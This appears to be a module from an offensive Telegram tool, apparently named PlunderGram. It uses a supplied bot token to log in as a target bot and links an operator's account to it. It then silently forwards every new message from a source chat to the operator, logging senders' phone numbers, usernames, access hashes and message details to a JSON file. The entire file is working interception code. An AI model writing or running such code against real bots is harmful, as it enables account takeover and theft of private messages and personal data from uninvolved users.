#PlunderGram/Modules/Boarding.py

from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import json
import os
from datetime import datetime
 
# Function to initiate contact with the bot
async def contact(ID, HASH, phone, prox, bot_info):
    """
    Function: contact

Description:
    An asynchronous function that connects to a Telegram client, sends a message to a specified bot, 
    and retrieves the user's chat ID. It handles the connection and disconnection of the Telegram client.

Arguments:
    - ID: A string representing the API ID for the Telegram client.
    - HASH: A string representing the API hash for the Telegram client.
    - phone: A string representing the phone number associated with the Telegram account.
    - prox: A dictionary or string representing the proxy settings for the Telegram client (if any).
    - bot_info: An object containing information about the bot, including its username.

Returns:
    - destchat: An integer representing the user's chat ID (destination chat) after sending the message.

Behavior:
    - Creates a TelegramClient instance using the provided ID, HASH, and proxy settings.
    - Starts the user client and authenticates using the provided phone number.
    - Prints a message indicating that the user client is connected and authenticated.
    - Sends a predefined command (/start) to the specified bot.
    - Retrieves the user's chat ID using get_me().
    - Disconnects the user client after sending the message and prints a disconnection message.
    - Returns the user's chat ID.
    """
    user_client = TelegramClient(StringSession(), ID, HASH, proxy=prox) 
    await user_client.start(phone)
    print('User client is connected and authenticated.')
    text = '/start'  # Command to trigger the bot

    # Send the message to the bot
    message = await user_client.send_message(bot_info.username, text)

    # Get the user's chat ID (destination chat)
    me = await user_client.get_me()
    destchat = me.id

    # Disconnect the user client after sending the message
    await user_client.disconnect()
    print('User client disconnected')

    return destchat

# Function to forward new messages from the source chat to the destination chat
async def forward_messages(client, sourcechat, destchat, json_file):
    # Listen for new messages in the source chat
    """"
Function: forward_messages

Description:
    An asynchronous function that listens for new messages in a specified source chat and forwards them to a destination chat. 
    It also saves sender and message information to a JSON file.

Arguments:
    - client: An instance of the Telegram client used to listen for and forward messages.
    - sourcechat: An integer representing the chat ID from which new messages will be forwarded.
    - destchat: An integer representing the chat ID to which messages will be forwarded.
    - json_file: A string representing the path to the JSON file where message data will be saved.

Returns:
    - None

Behavior:
    - Sets up an event handler that listens for new messages in the specified sourcechat.
    - When a new message is received:
        - Retrieves the sender's information and prepares a data dictionary containing details about the sender and the message.
        - Checks if the specified JSON file exists:
            - If it exists, loads the existing message data from the file.
            - If it does not exist, initializes an empty list for messages.
        - Appends the new message data to the list and saves it back to the JSON file.
        - Forwards the received message to the specified destchat.
    """
    @client.on(events.NewMessage(chats=sourcechat))
    async def handler(event):
        # Get sender information
        original_sender = await event.get_sender()
        
        # Print sender information
# Prepare data to save
        data = {
            "sender": {
                "id": original_sender.id,
                "first_name": original_sender.first_name,
                "last_name": original_sender.last_name,
                "username": original_sender.username if original_sender.username else None,
                "phone": original_sender.phone if original_sender.phone else None,
                "is_bot": original_sender.bot,
                "access_hash": original_sender.access_hash,
                "is_verified": original_sender.verified,
                "is_restricted": original_sender.restricted,
                "is_deleted": getattr(original_sender, 'deleted', None),
                "is_scammer": getattr(original_sender, 'scam', None),
                "about": getattr(original_sender, 'about', None)
            },
            "message": {
                "id": event.message.id,
                "text": event.message.text,
                "date": str(event.message.date),
                "is_media": event.message.media is not None,
                "media_type": event.message.media.__class__.__name__ if event.message.media else None,
                "reply_to": event.message.reply_to_msg_id,
                "is_edited": event.message.edit_date is not None,
                "edit_date": str(event.message.edit_date) if event.message.edit_date else None,
                "views": getattr(event.message, 'views', None),
                "forward_info": str(event.message.fwd_from) if event.message.fwd_from else None
            }
        }

        # Load existing data
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r', encoding='utf-8') as f:
                    messages = json.load(f)
            except (json.JSONDecodeError, FileNotFoundError):
                messages = []
        else:
            messages = []

        # Append and save back
        messages.append(data)
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(messages, f, ensure_ascii=False, indent=2)


        # Forward the message to destination chat
        await client.forward_messages(destchat, event.message.id, from_peer=sourcechat)


# Main boarding function
async def boarding(captain, target, sourcechat, output_dir):
    """
    Function: boarding

Description:
    An asynchronous function that sets up a Telegram bot client, establishes contact with a specified bot, 
    and forwards messages from a source chat to a destination chat. 
    It handles the connection and disconnection of the bot client.

Arguments:
    - captain: A dictionary containing the credentials and configuration for the Telegram bot, including:
        - id: A string representing the API ID for the Telegram client.
        - hash: A string representing the API hash for the Telegram client.
        - phone: A string representing the phone number associated with the Telegram account.
        - type: A string representing the type of proxy (if any).
        - host: A string representing the proxy host (if any).
        - port: An integer representing the proxy port (if any).
    - target: A string representing the bot token for the Telegram bot.
    - sourcechat: An integer representing the chat ID from which messages will be forwarded.

Returns:
    - None

Behavior:
    - Extracts values from the captain dictionary to configure the bot client and proxy settings.
    - Creates a TelegramClient instance for the bot using the provided credentials and proxy settings.
    - Starts the bot client and authenticates using the provided bot token.
    - Prints a message indicating that the bot client is connected and authenticated.
    - Retrieves information about the bot using get_me().
    - Calls the contact function to initiate contact with the bot and obtain the destination chat ID.
    - Starts forwarding messages from the sourcechat to the destchat using the forward_messages function.
    - Runs the bot client until it is disconnected.
    - Catches and prints any exceptions that occur during execution.
    - In the finally block, disconnects the bot client and prints a disconnection message.
    """
    # Extract values from the captain dictionary
    ID = captain['id']
    HASH = captain['hash']
    phone= captain['phone']
    type = captain['type']
    host = captain['host']
    port = int(captain['port'])
    prox = (type, host, port)

    date_str = datetime.now().strftime('%Y-%m-%d')
    filez = str(date_str + '_Boarding_Forwarded.json')
    json_file = os.path.join(output_dir, filez)
    try:
        # Create user and bot clients using the provided credentials
        bot_client = TelegramClient(StringSession(), ID, HASH, proxy=prox)
        await bot_client.start(bot_token=target)
        print("Bot client is connected and authenticated.")
        bot_info = await bot_client.get_me()
        # Initiate contact with the bot and get destination chat ID
        destchat = await contact(ID, HASH, phone, prox, bot_info)

        # Start forwarding messages from sourcechat to destchat
        await forward_messages(bot_client, sourcechat, destchat, json_file)

        await bot_client.run_until_disconnected()

    except Exception as e:
        print(f"Boarding Error: {e}")

    finally:
        await bot_client.disconnect()
        print("Bot client disconnected.")